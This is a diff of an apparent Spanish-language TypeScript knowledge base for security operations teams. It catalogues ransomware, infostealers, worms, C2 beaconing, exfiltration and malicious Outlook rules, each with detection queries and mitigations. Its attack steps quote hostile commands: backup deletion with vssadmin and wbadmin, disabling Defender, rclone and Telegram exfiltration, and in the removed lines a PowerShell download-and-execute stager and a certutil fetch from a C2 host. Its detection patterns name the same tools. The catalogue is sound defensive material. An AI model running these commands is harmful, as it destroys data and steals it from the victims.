-      'Variante low&slow: adjuntos desde el Outlook de la víctima a webmails personales + regla de forwarding que oculta los enviados (cruza con PER-008)',
-    ],
-    deteccion: {
-      kql: 'DeviceProcessEvents | where ProcessCommandLine has "rclone" or FileName in~ ("rclone.exe", "MEGAsync.exe") | take 10 // volumen: alertar por delta de bytes subidos por host/destino en el proxy; DeviceNetworkEvents con RemoteUrl has_any ("mega.nz", "api.telegram.org")',
-      spl: 'index=net sourcetype=flow | stats sum(bytes) as total by src, dest | where total > 1000000000 | sort - total // > 1 GB acumulado a un mismo destino = investigar',
-      win_event_ids: [5140],
-    },
-    mitigacion: [
-      'Allowlist estricta de storage clouds: los no usados por la empresa (mega.nz, medios de transferencia) no pasan por el proxy',
-      'Bloquear api.telegram.org salvo bots registrados; alertar el user-agent "rclone/" aunque el destino esté permitido',
-      'DLP por UMBRAL de volumen (GB/día por host-destino), no solo por contenido — la fuga masiva es siempre volumétrica',
-      'Backups cifrados + least privilege en shares: reduce el premio y hace la exfiltración lenta y visible',
-    ],
-    referencias: [
-      'https://attack.mitre.org/techniques/T1567/002/',
-      'https://www.cisa.gov/stopransomware',
-    ],
-  },
-  {
-    id: 'PER-008',
-    nombre: 'Reglas maliciosas de Outlook (persistencia en correo)',
-    alias: ['Outlook rules', 'ruler', 'InboxRule maliciosa', 'reglas de bandeja como backdoor'],
-    categoria: 'Persistencia',
-    severidad: 'High',
-    mitre_attack: ['T1137.005'],
-    descripcion_tecnica: 'Reglas de Outlook creadas desde la mailbox comprometida (MAPI/EWS/OWA, o la herramienta ruler de SensePost): "al llegar un correo con asunto X → guardar adjunto y EJECUTARLO" (payload en la estación de la víctima) o "mover a carpeta oculta y marcar leído" (ocultación para BEC). Las reglas viven en el servidor (items FAI del mailbox), así que sobreviven al cambio de contraseña — el clásico post-account-takeover que "no se va".',
-    impacto_iam_soc: 'Persistencia y ocultación tras un ATO: los replies del proveedor verdadero desaparecen y el malware se re-dispara a demanda. Para el SOC: New-InboxRule/Set-InboxRule en los logs de Exchange/OfficeActivity — telemetría que casi nadie monitoriza.',
-    como_funciona: [
-      'ruler (SensePost) autentica contra EWS/OWA de la víctima y crea la regla: from/subject "continuar" → StartApplication C:\\Users\\...\\payload.bat',
-      'El atacante se envía (o espera) un correo con ese asunto → el cliente de la víctima ejecuta el payload sin interacción del usuario',
-      'Variante BEC/ocultación: regla que mueve a "Sync Issues"/carpeta oculta y marca leído — la víctima nunca ve los replies del proveedor real al fraude',
-      'La regla persiste en el mailbox del servidor: resetear la contraseña NO la elimina; hay que purgar reglas y forms explícitamente',
-    ],
-    deteccion: {
-      kql: 'OfficeActivity | where Operation in~ ("New-InboxRule", "Set-InboxRule") | extend p = tostring(Parameters) | where p contains "DeleteMessage" or p contains "StartApplication" or p contains "MoveToFolder" or p contains "ForwardAsAttachment" | take 20',
-      spl: 'index=o365 sourcetype=o365:management:activity Workload=Exchange Operation="New-InboxRule" | table _time, UserId, Parameters',
-      sigma: 'office_mailboxrule_suspicious (custom)',
-    },
-    mitigacion: [
-      'Monitorizar New-InboxRule/Set-InboxRule (y forwarding a externos) para toda la flota, especialmente cuentas de finanzas y dirección',
-      'MFA + Conditional Access en OWA/EWS y bloqueo de legacy/basic auth (ruler depende de autenticación básica en muchos despliegues)',
-      'En todo ATO: revisar y purgar reglas, forms y delegaciones de la mailbox (el reset de password es solo el primer paso)',
-      'Política de Outlook que deshabilita reglas de tipo "iniciar aplicación" y saneamiento de permisos de carpeta',
-    ],
-    referencias: [
-      'https://attack.mitre.org/techniques/T1137/005/',
-      'https://github.com/sensepost/ruler',
-    ],
-  },
-];
 
 /* ============================ SOCIAL / INGENIERÍA SOCIAL ============================ */
 
@@ -454,7 +68,7 @@ export const SE_ATTACKS: AttackInfo[] = [
     como_funciona: [
       'OSINT del empleado (LinkedIn, HR leaked data) + datos internos filtrados para construir credibilidad: número de empleado, título, manager',
       'Llamada al helpdesk con la "emergencia": estoy de viaje, me he bloqueado, tengo la reunión con el board en 20 minutos',
-      'El agente resetea el MFA y el atacante registra SU dispositivo como nuevo factor; a veces piden además un RMM "para que soporte lo arregle" (cruza LAT-004)',
+      'El agente resetea el MFA y el atacante registra SU dispositivo como nuevo factor; a veces piden además instalar un RMM "para que soporte lo arregle"',
       'Deepfake de voz: pocos segundos de un directivo en un video público bastan para clonar el timbre; se usa en llamadas "del CFO" para aprobaciones urgentes',
     ],
     deteccion: {
@@ -485,7 +99,7 @@ export const SE_ATTACKS: AttackInfo[] = [
       'SMS masivo con dominio corto o "paquetería" hacia el portal falso que pide 2 EUR de "gastos de aduana" (roba la tarjeta completa)',
       'Quishing: QR en un PDF adjunto de correo corporativo o en carteles físicos (parking, menú) — el navegador del móvil no pasa por el proxy de la empresa',
       'Variante corporativa: SMS de "IT: tu MFA expira hoy, regístralo aquí" con página que captura credenciales + OTP y lo reenvía al atacante en tiempo real (relay manual)',
-      'Combinado con SIM swapping: no roban el enlace, roban el número — los OTP les llegan directamente',
+      'Combinado con SIM swapping (en Vulnerabilidades): no roban el enlace, roban el número — los OTP les llegan directamente',
     ],
     deteccion: {
       kql: 'EmailUrlInfo | where UrlDomain endswith ".link" or UrlDomain endswith ".top" or UrlDomain endswith ".xyz" | take 20 // quishing: QR que apunta a shorteners/dominios raros; el smishing puro solo se ve con feed del operador/MDM o reporte del usuario',
@@ -515,7 +129,7 @@ export const SE_ATTACKS: AttackInfo[] = [
       'Acceso a la mailbox (phishing AiTM, infostealer, BEC-as-a-service en underground) o registro de dominio lookalike del proveedor',
       'Fase de lurk: semanas leyendo la conversación real de facturación para aprender nombres, importes, ciclos y tono',
       'El golpe: mail desde la mailbox REAL del CFO — "operación confidencial de adquisición, transfiere a esta cuenta intermedia" — o la factura del proveedor con el IBAN cambiado',
-      'Ocultación: reglas de Outlook que mueven los replies del proveedor verdadero a carpeta oculta (PER-008) — la víctima solo ve la conversación falsa',
+      'Ocultación: reglas de Outlook que mueven los replies del proveedor verdadero a carpeta oculta (las reglas maliciosas de Outlook viven en Vulnerabilidades) — la víctima solo ve la conversación falsa',
     ],
     deteccion: {
       kql: 'OfficeActivity | where Operation in~ ("New-InboxRule", "Set-Mailbox") | extend p = tostring(Parameters) | where p contains "Forward" or p contains "smtp" | take 20 // y correo de dirección/finanzas con "urgent", "confidencial", "IBAN", "cambio de cuenta"',
@@ -683,7 +297,11 @@ export const SE_ATTACKS: AttackInfo[] = [
   },
 ];
 
-/* ============================ MALWARE / SUPPLY CHAIN ============================ */
+/* ============================ MALWARE / C2 / EXFILTRACIÓN ============================ */
+/* Nota: persistencia técnica (Run keys, WMI subs, tareas, servicios,
+   Outlook rules, LOLBins, rootkits) y movimiento lateral viven en
+   ../vulnerabilities.ts — este bloque cubre el MALWARE como fenómeno
+   operativo, el comportamiento C2 y la salida de datos. */
 
 export const MAL_ATTACKS: AttackInfo[] = [
   {
@@ -694,11 +312,11 @@ export const MAL_ATTACKS: AttackInfo[] = [
     severidad: 'Critical',
     mitre_attack: ['T1486', 'T1657'],
     descripcion_tecnica: 'Cifrado + robo + extorsión: primero exfiltran los datos (doble extorsión), luego cifran con AES/RSA híbrido y piden rescate amenazando con publicar el leak en su site. Industrializado como Ransomware-as-a-Service: affiliates alquilan el payload, el negotiator y el leak site (LockBit, BlackCat/ALPHV, Akira, Play, RansomHub 2023-2025) con paneles de víctima y soporte.',
-    impacto_iam_soc: 'Paralización del negocio + fuga + extorsión reputacional. La clave para el SOC: semanas ANTES del cifrado hubo acceso — logons 4624 anómalos, servicios 7045, un RMM silencioso (LAT-004) y exfiltración (PER-007) fueron la ventana que se ignoró. El cifrado es el último minuto, no el ataque.',
+    impacto_iam_soc: 'Paralización del negocio + fuga + extorsión reputacional. La clave para el SOC: semanas ANTES del cifrado hubo acceso — logons 4624 anómalos, servicios 7045, un RMM silencioso (el abuso de RMM vive en Vulnerabilidades) y exfiltración (MAL-008) fueron la ventana que se ignoró. El cifrado es el último minuto, no el ataque.',
     como_funciona: [
       'Acceso inicial (phishing, VPN sin MFA, infostealer, RDP expuesto) → reconocimiento con herramientas admin (AdFind, SharpHound)',
-      'Escalada y lateral (LAT-001), robo de credenciales (LSASS), despliegue de RMM/AnyDesk y creación de cuentas doradas (PER-004)',
-      'Exfiltración (rclone→cloud, PER-007) y destrucción de backups: vssadmin delete shadows /all, wbadmin delete catalog, deshabilitar Defender (Add-MpPreference -DisableRealtimeMonitoring)',
+      'Escalada y movimiento lateral, robo de credenciales (LSASS), despliegue de RMM/AnyDesk y creación de cuentas doradas',
+      'Exfiltración (rclone→cloud — MAL-008) y destrucción de backups: vssadmin delete shadows /all, wbadmin delete catalog, deshabilitar Defender (Add-MpPreference -DisableRealtimeMonitoring)',
       'Deploy masivo del payload por GPO/PsExec con notas de rescate y deadline en el leak site — extorsión T1657 incluye llamadas y DDoS a la víctima',
     ],
     deteccion: {
@@ -731,7 +349,7 @@ export const MAL_ATTACKS: AttackInfo[] = [
       'SolarWinds: comprometen el build de Orion → la DLL firmada SUNBURST llega por el update legítimo; beacon tras el período de gracia para mezclarse con despliegues masivos',
       'Dependency confusion: los nombres de paquetes internos no publicados en npm/PyPI se registran por el atacante con versión superior — el gestor de dependencias prefiere la pública',
       'Typosquatting/forks maliciosos: requestss, python-requsts, o PRs a proyectos OSS con tokens robados (xz utils: años de ingeniería social al maintainer)',
-      'El payload se ejecuta en CI/CD o en runtime con los privilegios de la app — a menudo altos: el pipeline con sus secrets y cloud creds',
+      'El payload se ejecuta en CI/CD o en runtime con los privilegios de la app — a menudo altos: el pipeline con sus secrets y cloud creds (el poisoning de CI/CD vive en Vulnerabilidades)',
     ],
     deteccion: {
       kql: 'DeviceNetworkEvents | where RemoteUrl has "avsvmcloud.com" | take 10 // genérico: SBOM diff (artefactos que cambian sin commit), hashes de build vs reproducible builds, y binarios firmados válidos generando tráfico DNS raro',
@@ -751,80 +369,18 @@ export const MAL_ATTACKS: AttackInfo[] = [
   },
   {
     id: 'MAL-003',
-    nombre: 'Malware fileless y LOLBins',
-    alias: ['fileless malware', 'LOLBins', 'living off the land', 'PowerShell in-memory'],
-    categoria: 'Malware',
-    severidad: 'High',
-    mitre_attack: ['T1059.001'],
-    descripcion_tecnica: 'Malware que no deja binario en disco: se carga directo en memoria de powershell.exe (IEX (New-Object Net.WebClient).DownloadString(...)), .NET assemblies reflectivos (execute-assembly de Cobalt Strike) o payloads WMI. El apoyo son los LOLBins: binarios firmados de Windows que descargan y ejecutan (certutil -urlcache, bitsadmin /transfer, msiexec, rundll32). No hay firma de AV que cazar — el "malware" son argumentos de herramientas legítimas.',
-    impacto_iam_soc: 'Evasión de controles basados en ficheros y de allowlists ingenuas (powershell.exe está permitido por definición). La respuesta es logging de CONTENIDO: script block logging (4104) + AMSI — si no están activados, no hay forense posible después.',
-    como_funciona: [
-      'Stager: powershell -nop -w hidden -enc <base64> → IEX descarga y ejecuta el payload 100% en memoria (nada toca disco)',
-      'Assembly .NET reflectivo: Invoke-ReflectivePEInjection o execute-assembly — Mimikatz corre dentro de powershell.exe como proceso legítimo',
-      'LOLBins para stage lateral: certutil -urlcache -split -f https://c2/x C:\\Temp\\x.exe (borrado tras ejecutar) o bitsadmin /transfer job /download',
-      'AMSI bypass en memoria (patch de AmsiScanBuffer) y ETW tampering para que ni AMSI ni el EDR vean el script que va a ejecutarse',
-    ],
-    deteccion: {
-      kql: 'DeviceProcessEvents | where FileName in~ ("powershell.exe", "pwsh.exe") and ProcessCommandLine has_any ("-enc", "IEX", "DownloadString", "FromBase64String", "bypass") | take 20 // LOLBins: cazar argumentos (certutil -urlcache, bitsadmin /transfer), no binarios',
-      spl: 'index=win EventCode=4104 | search "IEX" OR "DownloadString" OR "FromBase64String" | table _time, host, Message | head 20',
-      sigma: 'powershell_suspicious_download_iex (custom)',
-      win_event_ids: [4103, 4104],
-    },
-    mitigacion: [
-      'PowerShell: script block logging + module logging (4103/4104) + Constrained Language Mode para usuarios no-admin',
-      'AMSI activo y monitorizado: los bypass de AMSI son por sí mismos alerta de nivel alto (no un incidente de estabilidad)',
-      'AppLocker/WDAC con reglas de path y DLL: bloquear certutil/bitsadmin hacia URLs arbitrarias (reglas de red) y rundll32 con javascript',
-      'EDR con telemetría de línea de comandos completa (no solo hash de binario) y detección de inyección/assembly reflectivo',
-    ],
-    referencias: [
-      'https://attack.mitre.org/techniques/T1059/001/',
-      'https://lolbas-project.github.io/',
-    ],
-  },
-  {
-    id: 'MAL-004',
-    nombre: 'Rootkits y bootkits',
-    alias: ['bootkit', 'UEFI rootkit', 'LoJax', 'BlackLotus', 'rootkit kernel-mode'],
-    categoria: 'Malware',
-    severidad: 'High',
-    mitre_attack: ['T1014'],
-    descripcion_tecnica: 'Malware que se esconde POR DEBAJO del sistema operativo: rootkits user-mode (hooks de API para ocultar procesos del task manager), rootkits kernel-mode (drivers firmados robados — BYOVD — que filtran la vista del kernel y deshabilitan EDR), y bootkits UEFI (LoJax 2018, primer UEFI rootkit visto en wild; BlackLotus 2023, primer bootkit que bypassea Secure Boot): viven en la flash de la placa, sobreviven a reinstalaciones completas del SO y cargan antes de que exista antivirus.',
-    impacto_iam_soc: 'La paranoia legítima del responder: "¿puedo confiar en lo que veo en este host?" — con rootkit, el análisis desde el propio SO es mentira. Detección práctica: hashes de firmware contra el OEM, arranques con Secure Boot deshabilitado y cross-view (comparar listados del kernel vs. los del EDR).',
-    como_funciona: [
-      'Rootkit user-mode: DLL inyectada que hookea APIs (NtQuerySystemInformation, ReadFile) para ocultar procesos, archivos y conexiones',
-      'Rootkit kernel: driver firmado vulnerable cargado (BYOVD) para ejecutar en ring 0, ocultar artefactos del kernel y atacar procesos protegidos del EDR (PPL)',
-      'Bootkit MBR clásico (TDL4) → moderno UEFI: LoJax escribió su implant en la SPI flash de la placa; el boot loader parchea winload en cada arranque',
-      'BlackLotus 2023: bootkit UEFI que explota una revocación de Secure Boot no aplicada (CVE-2022-21894) — vendido en underground por ~5k USD',
-    ],
-    deteccion: {
-      kql: 'DeviceProcessEvents | where ProcessCommandLine has_any ("bcdedit /set testsigning", "bcdedit /set nointegritychecks", "setup_var") | take 10 // firmware: comparar hash BIOS vs OEM (revisión manual/estado); MBR: alertar escrituras raw a \\Device\\Harddisk0',
-      spl: 'index=edr sourcetype=process | search "bcdedit" OR "PhysicalDrive" OR "setup_var" | table host, CommandLine | sort -_time',
-    },
-    mitigacion: [
-      'Secure Boot activado con las revocaciones de dbx al día (KB5025885 y sucesivas para BlackLotus en Win10/11)',
-      'WDAC + HVCI/VBS (memory integrity): bloquea drivers maliciosos en kernel y ataques de BYOVD conocidos',
-      'Actualización de firmware por Windows Update/UEFI capsule y verificación periódica de hashes con el tooling del OEM (Dell/Lenovo/HP)',
-      'Ante infección UEFI confirmada: re-flashear firmware desde el fabricante y reimagear — reinstalar el SO NO elimina el implant',
-    ],
-    referencias: [
-      'https://attack.mitre.org/techniques/T1014/',
-      'https://www.welivesecurity.com/2018/09/05/lojax-first-uefi-rootkit-found-wild-come-armed/',
-    ],
-  },
-  {
-    id: 'MAL-005',
     nombre: 'Infostealers',
     alias: ['stealer', 'RedLine', 'Lumma/LummaC2', 'StealC', 'Vidar', 'logs de infostealer'],
     categoria: 'Malware',
     severidad: 'Critical',
     mitre_attack: ['T1539', 'T1555.003'],
-    descripcion_tecnica: 'Malware dedicado a robar TODO lo que guardan el navegador y el sistema: cookies de sesión, tokens, passwords guardadas, autofill con tarjetas y wallets de cripto — de Chrome/Edge/Firefox y apps desktop (Telegram, Discord). RedLine (desarticulado en 2023), Lumma/LummaC2, StealC o Vidar operan como Malware-as-a-Service y venden los "logs" en markets tipo Russian Market.',
+    descripcion_tecnica: 'Malware dedicado a robar TODO lo que guardan el navegador y el sistema: cookies de sesión, tokens, passwords guardadas, autofill con tarjetas y wallets de cripto — de Chrome/Edge/Firefox y apps desktop (Telegram, Discord). RedLine (desarticulado en 2023), Lumma/LummaC2, StealC o Vidar operan como Malware-as-a-Service y venden los "logs" en markets tipo Russian Market. El robo de credenciales en vivo (keylogging) y el stuffing con passwords filtradas viven en otras entradas: aquí el botín es el ALMACÉN del navegador.',
     impacto_iam_soc: 'Vector #1 de acceso inicial 2023-2025: roban la COOKIE DE SESIÓN, no la contraseña — el login del atacante es "válido" y el MFA ni se entera (session replay con fingerprint clonado). Para el SOC: logins desde IP/fingerprint nuevos con la cookie correcta y nada más anómalo.',
     como_funciona: [
       'Distribución: instaladores falsos (SEO poisoning — SE-008, cracking tools, juegos piratas), malvertising o como segunda etapa de otro malware',
       'Robo con permisos de usuario: descifra DPAPI del perfil y lee Login Data (SQLite de Chromium), Local State (cookies cifradas) y cookies.sqlite de Firefox',
       'Completa el log: system info, lista de AV, screenshot, wallets, tokens de Telegram/Discord Desktop — todo empaquetado por origen',
-      'El comprador del log hace replay de cookies contra el SSO corporativo con un browser del fingerprint clonado (credential stuffing de sesiones)',
+      'El comprador del log hace replay de cookies contra el SSO corporativo con un browser del fingerprint clonado (el credential stuffing vive en Vulnerabilidades)',
     ],
     deteccion: {
       kql: 'DeviceFileEvents | where FileName in~ ("Login Data", "Local State", "cookies.sqlite") | where InitiatingProcessFileName !in~ ("chrome.exe", "msedge.exe", "firefox.exe", "msedgewebview2.exe") | take 20 // proceso ajeno al browser leyendo su almacén de credenciales',
@@ -844,7 +400,7 @@ export const MAL_ATTACKS: AttackInfo[] = [
     ],
   },
   {
-    id: 'MAL-006',
+    id: 'MAL-004',
     nombre: 'Criptojacking',
     alias: ['criptominer', 'XMRig', 'minería ilegal', 'cryptojacking'],
     categoria: 'Malware',
@@ -855,8 +411,8 @@ export const MAL_ATTACKS: AttackInfo[] = [
     como_funciona: [
       'Entrada: RCE en servicio expuesto (Log4Shell fue una mina de oro), creds cloud filtradas en repos, o imagen de contenedor typosquatted en Docker Hub',
       'Descarga del miner (XMRig compilado o fork con el wallet del atacante) y configuración del pool; en k8s: DaemonSet o Job efímero que se recrea',
-      'Ocultación: renombrar el proceso a algo del sistema (kworker), limitar CPU para no delatarse (throttling) y persistencia con cron/systemd timers',
-      'Con creds de nube válidas: escalar a otras suscripciones lanzando VMs en regiones baratas — el "worm" cloud moderno',
+      'Ocultación: renombrar el proceso a algo del sistema (kworker), limitar CPU para no delatarse (throttling) y persistencia con cron/systemd timers (la persistencia técnica vive en Vulnerabilidades)',
+      'Con creds de nube válidas: escalar a otras suscripciones lanzando VMs en regiones baratas — el "worm" cloud moderno (los gusanos clásicos: MAL-006)',
     ],
     deteccion: {
       kql: 'DeviceProcessEvents | where ProcessCommandLine has_any ("stratum+tcp", "xmrig", "--donate-level") or FileName in~ ("xmrig.exe", "minerd", "kworkerds") | take 10 // y alerta de CPU > 90% sostenido 15 min en servidores productivos',
@@ -874,7 +430,7 @@ export const MAL_ATTACKS: AttackInfo[] = [
     ],
   },
   {
-    id: 'MAL-007',
+    id: 'MAL-005',
     nombre: 'Wipers (destrucción de datos)',
     alias: ['wiper', 'data destruction', 'NotPetya', 'Shamoon', 'Hermetic Wiper'],
     categoria: 'Malware',
@@ -901,6 +457,101 @@ export const MAL_ATTACKS: AttackInfo[] = [
     referencias: [
       'https://attack.mitre.org/techniques/T1485/',
       'https://www.wired.com/story/notpetya-cyberattack-ukraine-russia-code-crash-the-world/',
+    ],
+  },
+  {
+    id: 'MAL-006',
+    nombre: 'Gusanos (propagación autónoma)',
+    alias: ['worm', 'self-propagating malware', 'EternalBlue worm', 'WannaCry spread', 'Morris worm'],
+    categoria: 'Malware',
+    severidad: 'High',
+    mitre_attack: ['T1030', 'T1021'],
+    descripcion_tecnica: 'Malware que se PROPAGA SOLO: cada host infectado escanea, explota y contagia a los siguientes sin interacción humana ni C2 obligatorio. Historia viva: Morris (1988, ~10% de la internet de entonces), Code Red/Nimda (2001), Conficker (2008-9, aún latente en OT), y el capítulo moderno: WannaCry y NotPetya cruzaron el mundo en horas SOLO por EternalBlue (SMB) + mimikatz-style credential harvesting — el ransomware era el payload, el gusano el transporte. La variante cloud: "worms" que escalan entre tenants/suscripciones con creds robadas (TeamTNT, operate con contenedores).',
+    impacto_iam_soc: 'La diferencia entre "un host comprometido" y "la empresa entera en 4 horas" (WannaCry: NHS, 200.000 hosts, 150 países — sin C2, pura infección en cadena). El patrón SOCAP: la señal es la PROPAGACIÓN — miles de conexiones SMB/445 o autenticaciones nuevas desde hosts internos que nunca se hablaron, en ventana de minutos. Un brote se contiene cortando segmentos, no limpiando hosts.',
+    como_funciona: [
+      'Entrada en un host (phishing, drive-by, USB — Conficker) y carga del vector de spread: exploit de red (EternalBlue/MS17-010) o credenciales reutilizadas',
+      'Scan interno agresivo: el host infectado barre rangos enteros (445/139, 3389, 22, 1433) y explota lo que responde vulnerable',
+      'Copiar + ejecutar en el siguiente host (a menudo via sched tasks/svc WMI — persistencia en Vulnerabilidades); el ciclo se repite sin humano',
+      'Payload final en cada nodo: ransomware (WannaCry), wiper (NotPetya), cryptominer o solo respaldo para el siguiente paso',
+    ],
+    deteccion: {
+      kql: 'DeviceNetworkEvents | where RemotePort in (445, 139, 3389, 22) | summarize targets=dcount(RemoteIP), conns=count() by DeviceName, bin(TimeGenerated, 5m) | where targets > 50 and conns > 200 | take 20 // host interno barriendo la red = gusano activo; correlar con 4624 en cascada',
+      spl: 'index=net | stats dc(dest) as targets, count by src, bin(_time, 5m) | where targets > 50 | sort -_time | head 20 // seguido de: pico de EventCode=4624 tipo 3 desde el mismo src',
+      sigma: 'net_worm_scan_propagation (custom)',
+      win_event_ids: [4624, 7045],
+    },
+    mitigacion: [
+      'Matar el vector base: parcheo de protocolos internos (SMB/RDP) y segmentación que frene el scan — el gusano solo viaja donde llega el protocolo',
+      'Monitor de propagación: alerta de host interno con dcount(destinos) anómalo en 5 min (no es comportamiento de usuario ni de servidor) + 4624 en cascada',
+      'Respuesta de contención agresiva: aislamiento automático de hosts (EDR) y capacidad REAL de cortar VLANs — contra un gusano, cada minuto son miles de hosts',
+      'Egress/segmentación cloud: los "cloud worms" escalan con creds — sin llaves de larga vida y con SCPs, la propagación entre tenants muere',
+    ],
+    referencias: [
+      'https://attack.mitre.org/techniques/T1030/',
+      'https://www.ncsc.gov.uk/information/wannacry-ransomware-incident', 'https://en.wikipedia.org/wiki/Morris_worm',
+    ],
+  },
+  {
+    id: 'MAL-007',
+    nombre: 'Beaconing C2 (Cobalt Strike / Sliver)',
+    alias: ['beaconing', 'C2 check-in', 'malleable C2', 'Sliver / Mythic / Havoc'],
+    categoria: 'Malware',
+    severidad: 'Critical',
+    mitre_attack: ['T1071.001'],
+    descripcion_tecnica: 'El canal de vida del implant: check-ins HTTPS periódicos al teamserver con sleep/jitter configurables y perfiles malleable (Cobalt Strike) que disfrazan el tráfico como una web real — URIs, headers y user-agent de un SaaS conocido. Sliver, Mythic o Havoc siguen el mismo concepto. La infraestructura delante (redirectors, dominios fast-flux, proxies residenciales) hace que bloquear una IP no sirva de nada.',
+    impacto_iam_soc: 'Sin C2 no hay post-explotación: localizarlo es prioridad #1 del SOC. La firma no existe; la señal es la regularidad del intervalo: mismo dominio, mismo delta (±jitter), 24/7, desde uno o pocos hosts, con volúmenes mínimos por check-in. (El C2 sobre DNS/DoH — túnel por el puerto 53 — vive en Vulnerabilidades).',
+    como_funciona: [
+      'El beacon duerme sleep segundos (p. ej. 60s) con jitter ±20% y hace GET/POST al teamserver o al redirector (nginx/CDN) que hay delante',
+      'El malleable profile transforma la metadata: cookies custom, URI /api/v2/get, headers de jquery.com — el tráfico "parece" una web legítima en el proxy',
+      'Infra: dominios fast-flux o pools residenciales rotando por reputación; redirectores desechables entre el beacon y el teamserver real',
+      'Modo dormant: sleep de horas tras lograr el objetivo — el beacon casi desaparece del tráfico y solo despierta para tareas',
+    ],
+    deteccion: {
+      kql: 'DeviceNetworkEvents | where RemotePort in (443, 8443) | summarize cnt=count(), hosts=dcount(DeviceName) by RemoteUrl, bin(TimeGenerated, 1h) | where cnt > 15 and hosts < 4 | take 20 // analizar la desviación del intervalo (delta_t) por URL: jitter bajo = beacon',
+      spl: 'index=proxy | streamstats current=f delta(_time) as dt by url | stats avg(dt) as media, stdev(dt) as jitter by url | where media < 3600 and jitter < 60 // RITA (activecm) automatiza exactamente esto',
+      sigma: 'net_conn_periodic_beaconing (custom)',
+    },
+    mitigacion: [
+      'Egress allowlist: endpoints corporativos solo hacia dominios categorizados — corta el C2 por defecto, no cuando ya es incidente',
+      'Análisis de periodicidad sobre proxy/Zscaler (RITA o equivalente) + alerta de "volumen bajo persistente" que los umbrales por-conteo ignoran',
+      'TLS inspection + fingerprinting JA3/JA4 para clientes no estándar (Python/Go del implant contra chrome real)',
+      'En respuesta: bloquear el dominio no basta — hay que cazar el proceso dormido en el host (timeline EDR, tareas programadas y persistencias asociadas)',
+    ],
+    referencias: [
+      'https://attack.mitre.org/techniques/T1071/001/',
+      'https://attack.mitre.org/software/S0154/',
+      'https://github.com/activecm/rita',
+    ],
+  },
+  {
+    id: 'MAL-008',
+    nombre: 'Exfiltración por canales legítimos (cloud storage / correo)',
+    alias: ['exfiltración a cloud', 'rclone', 'MEGA/Dropbox/Telegram', 'exfil por canales permitidos'],
+    categoria: 'Malware',
+    severidad: 'High',
+    mitre_attack: ['T1567.002'],
+    descripcion_tecnica: 'Sacar los datos por servicios que el proxy ya permite: rclone contra MEGA/Dropbox/S3 (la navaja suiza del playbook de ransomware: multihilo, reanudable, logs amables), bots de Telegram (api.telegram.org/sendDocument), OneDrive/Drive del propio tenant o simplemente correos con adjuntos hacia webmails personales. Al DLP le cuesta distinguirlo del uso legítimo.',
+    impacto_iam_soc: 'Es el primer golpe de la doble extorsión: los datos ya están fuera ANTES del cifrado. Para el SOC: user-agent rclone/vX en el proxy, pico de upload sostenido a un solo dominio cloud, transferencias SMB masivas previas de stageo (5140/5145) o un bot de Telegram que nadie registró.',
+    como_funciona: [
+      'rclone config con backend mega/dropbox + rclone copy "C:\\Shares\\Finanzas" remote:fin -P — el estándar del playbook Conti y sucesores',
+      'Telegram: POST a api.telegram.org/bot<token>/sendDocument con el zip — se camufla como tráfico de mensajería normal',
+      'Stageo previo por SMB: movimiento de terabytes hacia un share poco usado antes de la subida (transferencias SMB grandes, EID 5140/5145)',
+      'Variante low&slow: adjuntos desde el Outlook de la víctima a webmails personales + regla de forwarding que oculta los enviados',
+    ],
+    deteccion: {
+      kql: 'DeviceProcessEvents | where ProcessCommandLine has "rclone" or FileName in~ ("rclone.exe", "MEGAsync.exe") | take 10 // volumen: alertar por delta de bytes subidos por host/destino en el proxy; DeviceNetworkEvents con RemoteUrl has_any ("mega.nz", "api.telegram.org")',
+      spl: 'index=net sourcetype=flow | stats sum(bytes) as total by src, dest | where total > 1000000000 | sort - total // > 1 GB acumulado a un mismo destino = investigar',
+      win_event_ids: [5140],
+    },
+    mitigacion: [
+      'Allowlist estricta de storage clouds: los no usados por la empresa (mega.nz, medios de transferencia) no pasan por el proxy',
+      'Bloquear api.telegram.org salvo bots registrados; alertar el user-agent "rclone/" aunque el destino esté permitido',
+      'DLP por UMBRAL de volumen (GB/día por host-destino), no solo por contenido — la fuga masiva es siempre volumétrica',
+      'Backups cifrados + least privilege en shares: reduce el premio y hace la exfiltración lenta y visible',
+    ],
+    referencias: [
+      'https://attack.mitre.org/techniques/T1567/002/',
+      'https://www.cisa.gov/stopransomware',
     ],
   },
 ];
